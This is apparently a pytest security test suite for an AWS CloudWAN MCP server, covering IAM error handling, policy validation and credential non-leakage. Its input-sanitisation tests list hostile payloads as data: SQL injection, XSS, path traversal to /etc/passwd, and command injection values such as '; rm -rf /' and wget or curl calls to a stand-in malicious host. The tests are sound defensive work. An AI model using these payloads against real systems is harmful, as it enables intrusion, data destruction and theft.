# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Security and compliance tests following AWS Labs patterns."""

import json
import os
from datetime import UTC, datetime
from unittest.mock import Mock, patch

import pytest
from botocore.exceptions import ClientError

from awslabs.cloudwan_mcp_server.server import (
    analyze_tgw_routes,
    aws_config_manager,
    get_core_network_policy,
    list_core_networks,
    validate_cloudwan_policy,
    validate_ip_cidr,
)


class TestIAMPermissionValidation:
    """Test IAM permission validation and security scenarios."""

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_iam_access_denied_scenarios(self) -> None:
        """Test comprehensive IAM access denied scenarios."""
        iam_error_scenarios = [
            {
                "error_code": "AccessDenied",
                "error_message": ("User: arn:aws:iam::123456789012:user/test-user is not "
                                "authorized to perform: networkmanager:ListCoreNetworks"),
                "function": list_core_networks,
                "service": "networkmanager"
            },
            {
                "error_code": "UnauthorizedOperation",
                "error_message": "You are not authorized to perform this operation",
                "function": analyze_tgw_routes,
                "service": "ec2",
                "args": ["tgw-rtb-unauthorized"]
            },
            {
                "error_code": "TokenRefreshRequired",
                "error_message": "The AWS Access Key Id needs a subscription for the service",
                "function": get_core_network_policy,
                "service": "networkmanager",
                "args": ["core-network-subscription-test"]
            },
            {
                "error_code": "InvalidUserID.NotFound",
                "error_message": "The user ID does not exist",
                "function": list_core_networks,
                "service": "networkmanager"
            }
        ]

        for scenario in iam_error_scenarios:
            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                mock_client = Mock()

                # Set up method-specific mocking
                if scenario["service"] == "networkmanager":
                    mock_client.list_core_networks.side_effect = ClientError(
                        {
                            "Error": {
                                "Code": scenario["error_code"],
                                "Message": scenario["error_message"]
                            },
                            "ResponseMetadata": {
                                "RequestId": f"req-{scenario['error_code']}-security-test",
                                "HTTPStatusCode": 403
                            }
                        },
                        "ListCoreNetworks"
                    )
                    mock_client.get_core_network_policy.side_effect = mock_client.list_core_networks.side_effect
                elif scenario["service"] == "ec2":
                    mock_client.search_transit_gateway_routes.side_effect = ClientError(
                        {
                            "Error": {
                                "Code": scenario["error_code"],
                                "Message": scenario["error_message"]
                            },
                            "ResponseMetadata": {
                                "RequestId": f"req-{scenario['error_code']}-security-test",
                                "HTTPStatusCode": 403
                            }
                        },
                        "SearchTransitGatewayRoutes"
                    )

                mock_get_client.return_value = mock_client

                # Execute function with args if provided
                if "args" in scenario and scenario["args"]:
                    result = await scenario["function"](*scenario["args"])
                else:
                    result = await scenario["function"]()

                parsed = json.loads(result)
                assert parsed["success"] is False
                assert scenario["error_code"] == parsed["error_code"]
                assert scenario["error_message"] in parsed["error"]

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_cross_account_permission_validation(self) -> None:
        """Test cross-account access permission validation."""
        cross_account_scenarios = [
            {
                "source_account": "111111111111",
                "target_account": "222222222222",
                "resource_arn": "arn:aws:networkmanager::222222222222:core-network/core-network-cross-account-test",
                "expected_error": "AccessDenied"
            },
            {
                "source_account": "333333333333",
                "target_account": "444444444444",
                "resource_arn": "arn:aws:ec2:us-east-1:444444444444:transit-gateway-route-table/tgw-rtb-cross-account",
                "expected_error": "UnauthorizedOperation"
            }
        ]

        for scenario in cross_account_scenarios:
            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                mock_client = Mock()
                mock_client.list_core_networks.side_effect = ClientError(
                    {
                        "Error": {
                            "Code": scenario["expected_error"],
                            "Message": (f"Cross-account access to {scenario['resource_arn']} from "
                                      f"account {scenario['source_account']} denied")
                        },
                        "ResponseMetadata": {"RequestId": "cross-account-test", "HTTPStatusCode": 403}
                    },
                    "ListCoreNetworks"
                )
                mock_get_client.return_value = mock_client

                result = await list_core_networks()
                parsed = json.loads(result)

                assert parsed["success"] is False
                assert parsed["error_code"] == scenario["expected_error"]
                assert scenario["target_account"] in parsed["error"]

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_resource_based_policy_validation(self) -> None:
        """Test resource-based policy access validation."""
        resource_policy_tests = [
            {
                "resource_type": "core-network",
                "resource_id": "core-network-rbp-test",
                "policy_effect": "Deny",
                "principal": "arn:aws:iam::123456789012:role/UnauthorizedRole"
            },
            {
                "resource_type": "global-network",
                "resource_id": "global-network-rbp-test",
                "policy_effect": "Allow",
                "principal": "arn:aws:iam::123456789012:role/AuthorizedRole"
            }
        ]

        for test_case in resource_policy_tests:
            expected_success = test_case["policy_effect"] == "Allow"

            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                mock_client = Mock()

                if expected_success:
                    mock_client.list_core_networks.return_value = {
                        "CoreNetworks": [{
                            "CoreNetworkId": test_case["resource_id"],
                            "State": "AVAILABLE"
                        }]
                    }
                else:
                    mock_client.list_core_networks.side_effect = ClientError(
                        {
                            "Error": {
                                "Code": "AccessDenied",
                                "Message": (f"Resource-based policy denies access to {test_case['resource_id']} "
                                          f"for principal {test_case['principal']}")
                            }
                        },
                        "ListCoreNetworks"
                    )

                mock_get_client.return_value = mock_client

                result = await list_core_networks()
                parsed = json.loads(result)

                assert parsed["success"] == expected_success


class TestInputSanitizationSecurity:
    """Test input sanitization and validation security."""

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self) -> None:
        """Test SQL injection attack prevention."""
        sql_injection_payloads = [
            "'; DROP TABLE core_networks; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users WHERE ''='",
            "1; INSERT INTO core_networks VALUES ('malicious');",
            "core-network-test'; DELETE FROM policies; --"
        ]

        for payload in sql_injection_payloads:
            try:
                # Test with potentially dangerous input
                result = await get_core_network_policy(payload)
                parsed = json.loads(result)

                # Should either handle gracefully or reject the input
                if not parsed["success"]:
                    # Verify it's rejected for the right reasons (validation, not SQL error)
                    assert "SQL" not in parsed.get("error", "").upper()
                    assert "DROP" not in parsed.get("error", "").upper()
                    assert "DELETE" not in parsed.get("error", "").upper()

            except Exception as e:
                # Should not expose SQL-related error details
                error_message = str(e).upper()
                assert "SQL" not in error_message
                assert "TABLE" not in error_message
                assert "DROP" not in error_message

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_xss_prevention(self) -> None:
        """Test XSS attack prevention in responses."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<svg onload=alert('xss')>",
            "expression(alert('xss'))"
        ]

        for payload in xss_payloads:
            result = await validate_ip_cidr("validate_ip", ip=payload)
            parsed = json.loads(result)

            # Should not include unescaped script tags in response
            response_text = json.dumps(parsed)
            assert "<script" not in response_text
            assert "javascript:" not in response_text
            assert "onerror=" not in response_text
            assert "onload=" not in response_text

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_command_injection_prevention(self) -> None:
        """Test command injection attack prevention."""
        command_injection_payloads = [
            "; ls -la",
            "& dir",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "; rm -rf /",
            "&& wget malicious.com/script.sh",
            "|| curl attacker.com"
        ]

        for payload in command_injection_payloads:
            result = await analyze_tgw_routes(payload)
            parsed = json.loads(result)

            # Should handle malicious input gracefully
            if not parsed["success"]:
                error_msg = parsed.get("error", "").lower()
                # Should not execute or reveal system commands
                assert "command not found" not in error_msg
                assert "permission denied" not in error_msg
                assert "no such file" not in error_msg

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self) -> None:
        """Test path traversal attack prevention."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]

        for payload in path_traversal_payloads:
            result = await get_core_network_policy(payload)
            parsed = json.loads(result)

            # Should not access files outside intended directory
            if not parsed["success"]:
                error_msg = parsed.get("error", "").lower()
                assert "/etc/passwd" not in error_msg
                assert "root:x:" not in error_msg
                assert "system32" not in error_msg

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_buffer_overflow_prevention(self) -> None:
        """Test buffer overflow attack prevention."""
        # Generate very long strings to test buffer limits
        long_payloads = [
            "A" * 1000,      # 1KB
            "B" * 10000,     # 10KB
            "C" * 100000,    # 100KB
            "D" * 1000000,   # 1MB
        ]

        for payload in long_payloads:
            try:
                result = await validate_ip_cidr("validate_ip", ip=payload)
                parsed = json.loads(result)

                # Should handle gracefully without crashing
                assert isinstance(parsed, dict)
                assert "success" in parsed

            except Exception as e:
                # Should not crash with memory-related errors
                error_msg = str(e).lower()
                assert "memory" not in error_msg
                assert "overflow" not in error_msg
                assert "segmentation" not in error_msg


class TestPolicyDocumentSecurity:
    """Test policy document security validation."""

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_malicious_policy_structure_detection(self) -> None:
        """Test detection of malicious policy structures."""
        malicious_policies = [
            # Policy with excessive nesting (potential DoS)
            {
                "version": "2021.12",
                "core-network-configuration": self._create_deeply_nested_structure(50)
            },
            # Policy with circular references
            {
                "version": "2021.12",
                "segments": [
                    {"name": "seg1", "references": ["seg2"]},
                    {"name": "seg2", "references": ["seg1"]}
                ]
            },
            # Policy with dangerous evaluation patterns
            {
                "version": "2021.12",
                "core-network-configuration": {
                    "eval": 'os.system("rm -rf /")',
                    "exec": 'import subprocess; subprocess.run(["ls"])'
                }
            }
        ]

        for malicious_policy in malicious_policies:
            result = await validate_cloudwan_policy(malicious_policy)
            parsed = json.loads(result)

            # Should complete without executing dangerous code
            assert isinstance(parsed, dict)
            assert "success" in parsed

            # Should not contain evidence of code execution
            response_text = json.dumps(parsed)
            assert "subprocess" not in response_text
            assert "os.system" not in response_text

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_policy_size_limits(self) -> None:
        """Test policy document size limits and DoS prevention."""
        # Create progressively larger policies
        policy_sizes = [
            ("1MB", 1024 * 1024),
            ("5MB", 5 * 1024 * 1024),
            ("10MB", 10 * 1024 * 1024)
        ]

        for size_name, target_size in policy_sizes:
            # Create large policy by repeating segments
            large_policy = {
                "version": "2021.12",
                "core-network-configuration": {
                    "asn-ranges": ["64512-64555"],
                    "edge-locations": [{"location": "us-east-1", "asn": 64512}]
                },
                "segments": []
            }

            # Add segments until we reach target size
            segment_template = {
                "name": "large-segment-{:06d}",
                "description": "A" * 1000,  # 1KB description
                "require-attachment-acceptance": False
            }

            current_size = len(json.dumps(large_policy))
            segment_count = 0

            while current_size < target_size and segment_count < 10000:
                segment = {k: v.format(segment_count) if isinstance(v, str) else v
                          for k, v in segment_template.items()}
                large_policy["segments"].append(segment)
                segment_count += 1
                current_size = len(json.dumps(large_policy))

            # Test processing large policy
            import time
            start_time = time.time()
            result = await validate_cloudwan_policy(large_policy)
            processing_time = time.time() - start_time

            parsed = json.loads(result)
            assert parsed["success"] is True

            # Should not take excessive time (DoS prevention)
            assert processing_time < 60.0, f"{size_name} policy took {processing_time:.2f}s"

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_policy_regex_dos_prevention(self) -> None:
        """Test prevention of regex-based DoS attacks."""
        # Patterns known to cause regex DoS
        dos_patterns = [
            # Catastrophic backtracking patterns
            "^(a+)+$" + "a" * 100 + "X",
            "^(a|a)*$" + "a" * 100 + "X",
            "^([a-zA-Z]+)*$" + "a" * 100 + "X",
            "^(a|b)*aaaa$" + "a" * 100 + "b",
        ]

        policy_with_regex = {
            "version": "2021.12",
            "core-network-configuration": {
                "asn-ranges": ["64512-64555"],
                "edge-locations": [{"location": "us-east-1", "asn": 64512}]
            },
            "attachment-policies": []
        }

        for i, pattern in enumerate(dos_patterns):
            policy_with_regex["attachment-policies"].append({
                "rule-number": i + 1,
                "conditions": [{
                    "type": "tag-value",
                    "key": "Name",
                    "value": pattern,
                    "operator": "matches-regex"
                }],
                "action": {"association-method": "constant", "segment": "test"}
            })

        # Should complete within reasonable time
        import time
        start_time = time.time()
        result = await validate_cloudwan_policy(policy_with_regex)
        processing_time = time.time() - start_time

        parsed = json.loads(result)
        assert parsed["success"] is True
        assert processing_time < 10.0, f"Regex DoS test took {processing_time:.2f}s"

    def _create_deeply_nested_structure(self, depth):
        """Create deeply nested structure for testing."""
        if depth == 0:
            return "deep_value"
        return {
            f"level_{depth}": self._create_deeply_nested_structure(depth - 1),
            f"array_{depth}": [self._create_deeply_nested_structure(depth - 1)]
        }


class TestCredentialHandlingSecurity:
    """Test credential handling and security."""

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_credential_exposure_prevention(self) -> None:
        """Test prevention of credential exposure in responses."""
        # Simulate various credential patterns
        credential_patterns = [
            "AKIA1234567890ABCDEF",  # AWS Access Key
            "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",  # AWS Secret Key
            "aws_session_token_example_1234567890",
            "arn:aws:sts::123456789012:assumed-role/test-role/session",
        ]

        # Test that credentials don't appear in responses
        with patch.dict(os.environ, {
            "AWS_ACCESS_KEY_ID": credential_patterns[0],
            "AWS_SECRET_ACCESS_KEY": credential_patterns[1],
            "AWS_SESSION_TOKEN": credential_patterns[2]
        }):
            result = await aws_config_manager("get_current")
            parsed = json.loads(result)

            response_text = json.dumps(parsed)

            self._assert_no_credential_leakage(credential_patterns, response_text, parsed)

    def _assert_no_credential_leakage(self, credential_patterns, response_text, parsed) -> None:
        """Assert that no credentials are exposed in the response."""
        for credential in credential_patterns:
            # Check that credentials don't appear in the response text
            assert credential not in response_text, f"Credential {credential[:8]}*** found in response"
        
        # Additional checks for common credential exposure patterns
        # If 'AWS_ACCESS_KEY_ID' appears in the response, it must only appear in the error field
        # and not leak the actual credential value
        if "AWS_ACCESS_KEY_ID" in response_text:
            error_field = parsed.get("current_configuration", {}).get("identity", {}).get("error", "")
            # Ensure 'AWS_ACCESS_KEY_ID' only appears in the error field
            assert "AWS_ACCESS_KEY_ID" in error_field, "'AWS_ACCESS_KEY_ID' found outside of error field"
            # Ensure the error field does not contain the actual credential value
            assert all(cred not in error_field for cred in credential_patterns), (
                "Credential value leaked in error field")
        else:
            assert "AWS_ACCESS_KEY_ID" not in response_text
        assert "AWS_SECRET_ACCESS_KEY" not in response_text
        assert "AWS_SESSION_TOKEN" not in response_text
        
        # Ensure sensitive environment variables are not exposed
        sensitive_env_vars = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"]
        for env_var in sensitive_env_vars:
            # Should not contain actual credential values, only sanitized references
            if env_var in response_text:
                # If environment variable name is mentioned, ensure no actual values follow
                import re
                pattern = rf'{env_var}["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]+)'
                matches = re.findall(pattern, response_text)
                for match in matches:
                    # Should not contain actual credential-like strings
                    assert len(match) < 10 or match in ["[REDACTED]", "[HIDDEN]", "***"], (
                        f"Potential credential exposure: {match[:8]}***")

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_temporary_credential_handling(self) -> None:
        """Test secure handling of temporary credentials."""
        temporary_creds = {
            "AccessKeyId": "ASIATEMP1234567890",
            "SecretAccessKey": "temp_secret_key_example",
            "SessionToken": "temp_session_token_very_long_example_1234567890",
            "Expiration": datetime.now(UTC).isoformat()
        }

        with patch("boto3.Session") as mock_session:
            mock_session.return_value.get_credentials.return_value.token = temporary_creds["SessionToken"]

            result = await list_core_networks()
            response_text = json.dumps(json.loads(result))

            # Temporary credentials should not leak
            assert temporary_creds["AccessKeyId"] not in response_text
            assert temporary_creds["SecretAccessKey"] not in response_text
            assert temporary_creds["SessionToken"] not in response_text

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_role_assumption_security(self) -> None:
        """Test secure role assumption practices."""
        test_role_arn = "arn:aws:iam::123456789012:role/CloudWANTestRole"

        with patch("awslabs.cloudwan_mcp_server.server.boto3.Session") as mock_session:
            # Mock STS assume role
            mock_sts = Mock()
            mock_sts.assume_role.return_value = {
                "Credentials": {
                    "AccessKeyId": "ASIA1234567890ABCDEF",
                    "SecretAccessKey": "assumed_role_secret_key",
                    "SessionToken": "assumed_role_session_token",
                    "Expiration": datetime.now(UTC)
                },
                "AssumedRoleUser": {
                    "AssumedRoleId": "AROA1234567890ABCDEF:test-session",
                    "Arn": f"{test_role_arn}/test-session"
                }
            }

            mock_session.return_value.client.return_value = mock_sts

            # Test role assumption doesn't expose credentials
            result = await aws_config_manager("validate_config")
            parsed = json.loads(result)

            response_text = json.dumps(parsed)
            assert "assumed_role_secret_key" not in response_text
            assert "assumed_role_session_token" not in response_text

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_credential_validation_security(self) -> None:
        """Test credential validation without exposure."""
        invalid_credentials = [
            ("", ""),  # Empty credentials
            ("invalid_access_key", "invalid_secret_key"),  # Invalid format
            ("AKIA1234567890ABCDEF", ""),  # Missing secret key
            ("", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),  # Missing access key
        ]

        for access_key, secret_key in invalid_credentials:
            with patch.dict(os.environ, {
                "AWS_ACCESS_KEY_ID": access_key,
                "AWS_SECRET_ACCESS_KEY": secret_key
            }, clear=False):
                result = await aws_config_manager("validate_config")
                parsed = json.loads(result)

                response_text = json.dumps(parsed)

                # Should not expose the invalid credentials in error messages
                if access_key:
                    assert access_key not in response_text
                if secret_key:
                    assert secret_key not in response_text

    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_session_token_security(self) -> None:
        """Test session token handling security."""
        # Test various session token scenarios
        session_scenarios = [
            {
                "name": "expired_token",
                "token": "expired_session_token_example",
                "error_code": "TokenRefreshRequired"
            },
            {
                "name": "invalid_token",
                "token": "invalid_session_token_format",
                "error_code": "InvalidToken"
            },
            {
                "name": "malformed_token",
                "token": '<script>alert("xss")</script>',
                "error_code": "MalformedToken"
            }
        ]

        for scenario in session_scenarios:
            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                mock_client = Mock()
                mock_client.list_core_networks.side_effect = ClientError(
                    {
                        "Error": {
                            "Code": scenario["error_code"],
                            "Message": "Session token validation failed"
                        }
                    },
                    "ListCoreNetworks"
                )
                mock_get_client.return_value = mock_client

                result = await list_core_networks()
                parsed = json.loads(result)

                assert parsed["success"] is False
                response_text = json.dumps(parsed)

                # Session token should not appear in response
                assert scenario["token"] not in response_text
                # XSS payload should be sanitized
                assert "<script>" not in response_text
